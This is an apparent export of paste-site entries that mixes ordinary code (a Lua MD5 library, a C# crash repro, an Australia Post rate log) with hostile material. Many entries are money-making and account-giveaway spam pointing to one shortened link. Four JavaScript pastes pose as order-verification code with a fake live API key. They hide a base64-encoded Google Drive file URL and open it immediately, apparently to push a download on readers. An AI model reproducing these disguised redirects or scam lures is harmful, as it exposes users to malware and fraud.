id,title,username,language,date,content
YdJyfgBD,md5,i6_quadcore,Lua,Sunday 23rd of March 2025 01:02:40 AM CDT,"local md5 = {
    _VERSION     = ""md5.lua 1.1.0"",
    _DESCRIPTION = ""MD5 computation in Lua (5.1-3, LuaJIT)"",
    _URL         = ""https://github.com/kikito/md5.lua"",
    _LICENSE     = [[
      MIT LICENSE
  
      Copyright (c) 2013 Enrique Garc√≠a Cota + Adam Baldwin + hanzao + Equi 4 Software
  
      Permission is hereby granted, free of charge, to any person obtaining a
      copy of this software and associated documentation files (the
      ""Software""), to deal in the Software without restriction, including
      without limitation the rights to use, copy, modify, merge, publish,
      distribute, sublicense, and/or sell copies of the Software, and to
      permit persons to whom the Software is furnished to do so, subject to
      the following conditions:
  
      The above copyright notice and this permission notice shall be included
      in all copies or substantial portions of the Software.
  
      THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS
      OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
      MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
      IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
      CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
      TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
      SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
    ]]
  }
  
  -- bit lib implementions
  
  local char, byte, format, rep, sub =
    string.char, string.byte, string.format, string.rep, string.sub
  local bit_or, bit_and, bit_not, bit_xor, bit_rshift, bit_lshift
  
  local ok, bit = pcall(require, 'bit')
  local ok_ffi, ffi = pcall(require, 'ffi')
  if ok then
    bit_or, bit_and, bit_not, bit_xor, bit_rshift, bit_lshift = bit.bor, bit.band, bit.bnot, bit.bxor, bit.rshift, bit.lshift
  else
    ok, bit = pcall(require, 'bit32')
  
    if ok then
  
      bit_not = bit.bnot
  
      local tobit = function(n)
        return n <= 0x7fffffff and n or -(bit_not(n) + 1)
      end
  
      local normalize = function(f)
        return function(a,b) return tobit(f(tobit(a), tobit(b))) end
      end
  
      bit_or, bit_and, bit_xor = normalize(bit.bor), normalize(bit.band), normalize(bit.bxor)
      bit_rshift, bit_lshift = normalize(bit.rshift), normalize(bit.lshift)
  
    else
  
      local function tbl2number(tbl)
        local result = 0
        local power = 1
        for i = 1, #tbl do
          result = result + tbl[i] * power
          power = power * 2
        end
        return result
      end
  
      local function expand(t1, t2)
        local big, small = t1, t2
        if(#big < #small) then
          big, small = small, big
        end
        -- expand small
        for i = #small + 1, #big do
          small[i] = 0
        end
      end
  
      local to_bits -- needs to be declared before bit_not
  
      bit_not = function(n)
        local tbl = to_bits(n)
        local size = math.max(#tbl, 32)
        for i = 1, size do
          if(tbl[i] == 1) then
            tbl[i] = 0
          else
            tbl[i] = 1
          end
        end
        return tbl2number(tbl)
      end
  
      -- defined as local above
      to_bits = function (n)
        if(n < 0) then
          -- negative
          return to_bits(bit_not(math.abs(n)) + 1)
        end
        -- to bits table
        local tbl = {}
        local cnt = 1
        local last
        while n > 0 do
          last      = n % 2
          tbl[cnt]  = last
          n         = (n-last)/2
          cnt       = cnt + 1
        end
  
        return tbl
      end
  
      bit_or = function(m, n)
        local tbl_m = to_bits(m)
        local tbl_n = to_bits(n)
        expand(tbl_m, tbl_n)
  
        local tbl = {}
        for i = 1, #tbl_m do
          if(tbl_m[i]== 0 and tbl_n[i] == 0) then
            tbl[i] = 0
          else
            tbl[i] = 1
          end
        end
  
        return tbl2number(tbl)
      end
  
      bit_and = function(m, n)
        local tbl_m = to_bits(m)
        local tbl_n = to_bits(n)
        expand(tbl_m, tbl_n)
  
        local tbl = {}
        for i = 1, #tbl_m do
          if(tbl_m[i]== 0 or tbl_n[i] == 0) then
            tbl[i] = 0
          else
            tbl[i] = 1
          end
        end
  
        return tbl2number(tbl)
      end
  
      bit_xor = function(m, n)
        local tbl_m = to_bits(m)
        local tbl_n = to_bits(n)
        expand(tbl_m, tbl_n)
  
        local tbl = {}
        for i = 1, #tbl_m do
          if(tbl_m[i] ~= tbl_n[i]) then
            tbl[i] = 1
          else
            tbl[i] = 0
          end
        end
  
        return tbl2number(tbl)
      end
  
      bit_rshift = function(n, bits)
        local high_bit = 0
        if(n < 0) then
          -- negative
          n = bit_not(math.abs(n)) + 1
          high_bit = 0x80000000
        end
  
        local floor = math.floor
  
        for i=1, bits do
          n = n/2
          n = bit_or(floor(n), high_bit)
        end
        return floor(n)
      end
  
      bit_lshift = function(n, bits)
        if(n < 0) then
          -- negative
          n = bit_not(math.abs(n)) + 1
        end
  
        for i=1, bits do
          n = n*2
        end
        return bit_and(n, 0xFFFFFFFF)
      end
    end
  end
  
  -- convert little-endian 32-bit int to a 4-char string
  local lei2str
  -- function is defined this way to allow full jit compilation (removing UCLO instruction in LuaJIT)
  if ok_ffi then
    local ct_IntType = ffi.typeof(""int[1]"")
    lei2str = function(i) return ffi.string(ct_IntType(i), 4) end
  else
    lei2str = function (i)
      local f=function (s) return char( bit_and( bit_rshift(i, s), 255)) end
      return f(0)..f(8)..f(16)..f(24)
    end
  end
  
  
  
  -- convert raw string to big-endian int
  local function str2bei(s)
    local v=0
    for i=1, #s do
      v = v * 256 + byte(s, i)
    end
    return v
  end
  
  -- convert raw string to little-endian int
  local str2lei
  
  if ok_ffi then
    local ct_constcharptr = ffi.typeof(""const char*"")
    local ct_constintptr = ffi.typeof(""const int*"")
    str2lei = function(s)
      local int = ct_constcharptr(s)
      return ffi.cast(ct_constintptr, int)[0]
    end
  else
    str2lei = function(s)
      local v=0
      for i = #s,1,-1 do
        v = v*256 + byte(s, i)
      end
      return v
      end
  end
  
  
  -- cut up a string in little-endian ints of given size
  local function cut_le_str(s)
    return {
      str2lei(sub(s, 1, 4)),
      str2lei(sub(s, 5, 8)),
      str2lei(sub(s, 9, 12)),
      str2lei(sub(s, 13, 16)),
      str2lei(sub(s, 17, 20)),
      str2lei(sub(s, 21, 24)),
      str2lei(sub(s, 25, 28)),
      str2lei(sub(s, 29, 32)),
      str2lei(sub(s, 33, 36)),
      str2lei(sub(s, 37, 40)),
      str2lei(sub(s, 41, 44)),
      str2lei(sub(s, 45, 48)),
      str2lei(sub(s, 49, 52)),
      str2lei(sub(s, 53, 56)),
      str2lei(sub(s, 57, 60)),
      str2lei(sub(s, 61, 64)),
    }
  end
  
  -- An MD5 mplementation in Lua, requires bitlib (hacked to use LuaBit from above, ugh)
  -- 10/02/2001 jcw@equi4.com
  
  local CONSTS = {
    0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
    0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
    0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
    0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
    0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
    0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
    0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
    0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
    0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
    0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
    0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
    0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
    0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
    0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
    0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
    0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
    0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
  }
  
  local f=function (x,y,z) return bit_or(bit_and(x,y),bit_and(-x-1,z)) end
  local g=function (x,y,z) return bit_or(bit_and(x,z),bit_and(y,-z-1)) end
  local h=function (x,y,z) return bit_xor(x,bit_xor(y,z)) end
  local i=function (x,y,z) return bit_xor(y,bit_or(x,-z-1)) end
  local z=function (ff,a,b,c,d,x,s,ac)
    a=bit_and(a+ff(b,c,d)+x+ac,0xFFFFFFFF)
    -- be *very* careful that left shift does not cause rounding!
    return bit_or(bit_lshift(bit_and(a,bit_rshift(0xFFFFFFFF,s)),s),bit_rshift(a,32-s))+b
  end
  
  local function transform(A,B,C,D,X)
    local a,b,c,d=A,B,C,D
    local t=CONSTS
  
    a=z(f,a,b,c,d,X[ 0], 7,t[ 1])
    d=z(f,d,a,b,c,X[ 1],12,t[ 2])
    c=z(f,c,d,a,b,X[ 2],17,t[ 3])
    b=z(f,b,c,d,a,X[ 3],22,t[ 4])
    a=z(f,a,b,c,d,X[ 4], 7,t[ 5])
    d=z(f,d,a,b,c,X[ 5],12,t[ 6])
    c=z(f,c,d,a,b,X[ 6],17,t[ 7])
    b=z(f,b,c,d,a,X[ 7],22,t[ 8])
    a=z(f,a,b,c,d,X[ 8], 7,t[ 9])
    d=z(f,d,a,b,c,X[ 9],12,t[10])
    c=z(f,c,d,a,b,X[10],17,t[11])
    b=z(f,b,c,d,a,X[11],22,t[12])
    a=z(f,a,b,c,d,X[12], 7,t[13])
    d=z(f,d,a,b,c,X[13],12,t[14])
    c=z(f,c,d,a,b,X[14],17,t[15])
    b=z(f,b,c,d,a,X[15],22,t[16])
  
    a=z(g,a,b,c,d,X[ 1], 5,t[17])
    d=z(g,d,a,b,c,X[ 6], 9,t[18])
    c=z(g,c,d,a,b,X[11],14,t[19])
    b=z(g,b,c,d,a,X[ 0],20,t[20])
    a=z(g,a,b,c,d,X[ 5], 5,t[21])
    d=z(g,d,a,b,c,X[10], 9,t[22])
    c=z(g,c,d,a,b,X[15],14,t[23])
    b=z(g,b,c,d,a,X[ 4],20,t[24])
    a=z(g,a,b,c,d,X[ 9], 5,t[25])
    d=z(g,d,a,b,c,X[14], 9,t[26])
    c=z(g,c,d,a,b,X[ 3],14,t[27])
    b=z(g,b,c,d,a,X[ 8],20,t[28])
    a=z(g,a,b,c,d,X[13], 5,t[29])
    d=z(g,d,a,b,c,X[ 2], 9,t[30])
    c=z(g,c,d,a,b,X[ 7],14,t[31])
    b=z(g,b,c,d,a,X[12],20,t[32])
  
    a=z(h,a,b,c,d,X[ 5], 4,t[33])
    d=z(h,d,a,b,c,X[ 8],11,t[34])
    c=z(h,c,d,a,b,X[11],16,t[35])
    b=z(h,b,c,d,a,X[14],23,t[36])
    a=z(h,a,b,c,d,X[ 1], 4,t[37])
    d=z(h,d,a,b,c,X[ 4],11,t[38])
    c=z(h,c,d,a,b,X[ 7],16,t[39])
    b=z(h,b,c,d,a,X[10],23,t[40])
    a=z(h,a,b,c,d,X[13], 4,t[41])
    d=z(h,d,a,b,c,X[ 0],11,t[42])
    c=z(h,c,d,a,b,X[ 3],16,t[43])
    b=z(h,b,c,d,a,X[ 6],23,t[44])
    a=z(h,a,b,c,d,X[ 9], 4,t[45])
    d=z(h,d,a,b,c,X[12],11,t[46])
    c=z(h,c,d,a,b,X[15],16,t[47])
    b=z(h,b,c,d,a,X[ 2],23,t[48])
  
    a=z(i,a,b,c,d,X[ 0], 6,t[49])
    d=z(i,d,a,b,c,X[ 7],10,t[50])
    c=z(i,c,d,a,b,X[14],15,t[51])
    b=z(i,b,c,d,a,X[ 5],21,t[52])
    a=z(i,a,b,c,d,X[12], 6,t[53])
    d=z(i,d,a,b,c,X[ 3],10,t[54])
    c=z(i,c,d,a,b,X[10],15,t[55])
    b=z(i,b,c,d,a,X[ 1],21,t[56])
    a=z(i,a,b,c,d,X[ 8], 6,t[57])
    d=z(i,d,a,b,c,X[15],10,t[58])
    c=z(i,c,d,a,b,X[ 6],15,t[59])
    b=z(i,b,c,d,a,X[13],21,t[60])
    a=z(i,a,b,c,d,X[ 4], 6,t[61])
    d=z(i,d,a,b,c,X[11],10,t[62])
    c=z(i,c,d,a,b,X[ 2],15,t[63])
    b=z(i,b,c,d,a,X[ 9],21,t[64])
  
    return bit_and(A+a,0xFFFFFFFF),bit_and(B+b,0xFFFFFFFF),
           bit_and(C+c,0xFFFFFFFF),bit_and(D+d,0xFFFFFFFF)
  end
  
  ----------------------------------------------------------------
  
  local function md5_update(self, s)
    self.pos = self.pos + #s
    s = self.buf .. s
    for ii = 1, #s - 63, 64 do
      local X = cut_le_str(sub(s,ii,ii+63))
      assert(#X == 16)
      X[0] = table.remove(X,1) -- zero based!
      self.a,self.b,self.c,self.d = transform(self.a,self.b,self.c,self.d,X)
    end
    self.buf = sub(s, math.floor(#s/64)*64 + 1, #s)
    return self
  end
  
  local function md5_finish(self)
    local msgLen = self.pos
    local padLen = 56 - msgLen % 64
  
    if msgLen % 64 > 56 then padLen = padLen + 64 end
  
    if padLen == 0 then padLen = 64 end
  
    local s = char(128) .. rep(char(0),padLen-1) .. lei2str(bit_and(8*msgLen, 0xFFFFFFFF)) .. lei2str(math.floor(msgLen/0x20000000))
    md5_update(self, s)
  
    assert(self.pos % 64 == 0)
    return lei2str(self.a) .. lei2str(self.b) .. lei2str(self.c) .. lei2str(self.d)
  end
  
  ----------------------------------------------------------------
  
  function md5.new()
    return { a = CONSTS[65], b = CONSTS[66], c = CONSTS[67], d = CONSTS[68],
             pos = 0,
             buf = '',
             update = md5_update,
             finish = md5_finish }
  end
  
  function md5.tohex(s)
    return format(""%08x%08x%08x%08x"", str2bei(sub(s, 1, 4)), str2bei(sub(s, 5, 8)), str2bei(sub(s, 9, 12)), str2bei(sub(s, 13, 16)))
  end
  
  function md5.sum(s)
    return md5.new():update(s):finish()
  end
  
  function md5.sumhexa(s)
    return md5.tohex(md5.sum(s))
  end
  
  return md5"
1Q83bJjA,EARN $900 INSTANTLY 2025 XN,foufana4,JavaScript,Sunday 23rd of March 2025 01:02:29 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

8RhmYTc9dx
"
WaKdPSCR,Random Gmail Acc EB,foufana4,JavaScript,Sunday 23rd of March 2025 01:00:25 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

o1jdlj79m3
"
FNaUxGUf,Binance account IL,ValkAlloush,JavaScript,Sunday 23rd of March 2025 12:57:52 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

6ZYTt2L6hO
"
y4CMEzDr,Untitled,bruhmanuser91roblox,JavaScript,Sunday 23rd of March 2025 12:56:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/165/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hL8uL11H,EARN $900 INSTANTLY 2025 XN,ValkAlloush,JavaScript,Sunday 23rd of March 2025 12:55:49 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

j91bvlnHDM
"
AJrSaKYB,Random Gmail Acc EB,ValkAlloush,JavaScript,Sunday 23rd of March 2025 12:53:43 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

jj4NHhtsly
"
8MAsu264,Make $1000 15-MINUTES (BEGINNER) L8,hovnoneznam,JavaScript,Sunday 23rd of March 2025 12:51:38 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

wfDtf16uwZ
"
evxAVbfJ,Binance account IL,hovnoneznam,JavaScript,Sunday 23rd of March 2025 12:49:31 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

kzueCQQjoH
"
pZ6TgfL5,EARN $900 INSTANTLY 2025 XN,hovnoneznam,JavaScript,Sunday 23rd of March 2025 12:47:26 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

eqwj7FBGpI
"
G1TMDTxH,Untitled,bruhmanuser91roblox,JavaScript,Sunday 23rd of March 2025 12:46:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/554/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
czFGFZ9Y,Random Gmail Acc EB,hovnoneznam,JavaScript,Sunday 23rd of March 2025 12:45:21 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

rizMgt50QI
"
VuXZebZ4,Make $1000 15-MINUTES (BEGINNER) L8,hovnoneznam,JavaScript,Sunday 23rd of March 2025 12:43:16 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

P9aoQl4lAy
"
ftJVPDZt,what,whitelava3203,C#,Sunday 23rd of March 2025 12:43:06 AM CDT,"using System.Reflection;

public interface IMyInterface
{
    void MyFunction();
}

public struct MyStruct : IMyInterface
{
    public void MyFunction() => Console.WriteLine(""Hello World!"");
}

public unsafe class Program
{
    const int TestMode = 1;
    public static void Main()
    {
        MyStruct instance = default;
        MyStruct* ptr = &instance;
        MethodInfo method = typeof(MyStruct).GetMethod(""MyFunction"");
        delegate*<void*, void> func1 = (delegate*<void*, void>)method.MethodHandle.GetFunctionPointer();

        switch (TestMode)
        {
            case 1:
                func1(ptr); //System.ExecutionEngineException: 'Exception of type 'System.ExecutionEngineException' was thrown.'
                break;
            case 2:
                func1((void*)1); //System.ExecutionEngineException: 'Exception of type 'System.ExecutionEngineException' was thrown.'
                break;
            case 3:
                func1((void*)0); //no error
                func1(ptr); //no error
                break;
        }
    }
}"
xUZKj9Jp,Aus Post Debug,Evenstephen,JSON,Sunday 23rd of March 2025 12:42:23 AM CDT,"Array ( [1] => Array ( [weight] => 5.35 [length] => 66.5 [height] => 16 [width] => 29 [quantity] => 1 [name] => Box #11 [postcode] => 3200 ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=29&height=16&weight=5.35&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Parcel Post [delivery_time] => Delivered in 2-3 business days [total_cost] => 23.45 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Parcel Post [cost] => 23.45 ) ) ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=29&height=16&weight=5.35&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Express Post [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item). [total_cost] => 32.25 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Express Post [cost] => 32.25 ) ) ) )

Packing Details: Array ( [1] => Array ( [weight] => 10.7 [length] => 66.5 [height] => 29 [width] => 32 [quantity] => 2 [name] => Box #19 [postcode] => 3200 ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=32&height=29&weight=10.7&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Parcel Post [delivery_time] => Delivered in 2-3 business days [total_cost] => 25.05 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Parcel Post [cost] => 25.05 ) ) ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=32&height=29&weight=10.7&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Express Post [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item). [total_cost] => 34.65 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Express Post [cost] => 34.65 ) ) ) )

Packing Details: Array ( [1] => Array ( [weight] => 15.9 [length] => 66.5 [height] => 38 [width] => 40.5 [quantity] => 3 [name] => Box #19 [postcode] => 3200 ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Parcel Post [delivery_time] => Delivered in 2-3 business days [total_cost] => 27.05 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Parcel Post [cost] => 27.05 ) ) ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Express Post [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item). [total_cost] => 37.65 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Express Post [cost] => 37.65 ) ) ) )

Have a coupon? Click here to enter your code

Packing Details: Array ( [1] => Array ( [weight] => 15.9 [length] => 66.5 [height] => 38 [width] => 40.5 [quantity] => 3 [name] => Box #19 [postcode] => 3200 ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Parcel Post [delivery_time] => Delivered in 2-3 business days [total_cost] => 27.05 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Parcel Post [cost] => 27.05 ) ) ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Express Post [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item). [total_cost] => 37.65 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Express Post [cost] => 37.65 ) ) ) )

Packing Details: Array ( [1] => Array ( [weight] => 15.9 [length] => 66.5 [height] => 38 [width] => 40.5 [quantity] => 3 [name] => Box #19 [postcode] => 3200 ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Parcel Post [delivery_time] => Delivered in 2-3 business days [total_cost] => 27.05 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Parcel Post [cost] => 27.05 ) ) ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Express Post [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item). [total_cost] => 37.65 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Express Post [cost] => 37.65 ) ) ) )

Packing Details: Array ( [1] => Array ( [weight] => 15.9 [length] => 66.5 [height] => 38 [width] => 40.5 [quantity] => 3 [name] => Box #19 [postcode] => 3200 ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Parcel Post [delivery_time] => Delivered in 2-3 business days [total_cost] => 27.05 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Parcel Post [cost] => 27.05 ) ) ) )

Packing Request: https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3200&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE: stdClass Object ( [postage_result] => stdClass Object ( [service] => Express Post [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item). [total_cost] => 37.65 [costs] => stdClass Object ( [cost] => stdClass Object ( [item] => Express Post [cost] => 37.65 ) ) ) )"
KHpB4dv9,Binance account IL,hovnoneznam,JavaScript,Sunday 23rd of March 2025 12:41:09 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

ufL0K49yhn
"
VtVKsk6G,Make $1000 15-MINUTES (BEGINNER) L8,boy029,JavaScript,Sunday 23rd of March 2025 12:37:32 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

DBY6LGRSQ1
"
AyAfq8q4,Binance account IL,boy029,JavaScript,Sunday 23rd of March 2025 12:35:27 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

Cq9OOLV0Hl
"
mvDDqdds,Untitled,bruhmanuser91roblox,JavaScript,Sunday 23rd of March 2025 12:35:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/276/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wRJNVuRy,EARN $900 INSTANTLY 2025 XN,boy029,JavaScript,Sunday 23rd of March 2025 12:33:23 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

iXWn1VO1Ma
"
agGVpMKy,Untitled,bruhmanuser91roblox,JavaScript,Sunday 23rd of March 2025 12:29:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/104/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rc5ivVUw,Flow account menu,riffburn,JavaScript,Sunday 23rd of March 2025 12:25:27 AM CDT,"// ==UserScript==
// @name         Flow Account Menu
